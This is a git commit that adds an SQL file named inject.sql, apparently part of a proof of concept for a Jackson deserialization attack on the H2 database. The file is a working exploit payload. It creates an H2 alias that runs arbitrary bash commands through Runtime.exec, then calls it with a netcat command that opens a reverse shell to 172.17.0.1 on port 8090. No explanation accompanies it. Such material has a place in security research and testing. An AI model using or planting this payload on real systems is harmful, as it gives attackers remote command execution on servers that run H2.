941ee0e5b85643dfe4363722840e713ae0609feb
Pawel <pawel.bartunek@gmail.com>
2019-08-16 06:45:11 -0400

    added inject.sql

---
+++ java-deser-jackson-h2/inject.sql
@@ -0,0 +1,6 @@
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {"bash", "-c", cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+        return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('nc 172.17.0.1 8090 -e /bin/sh')
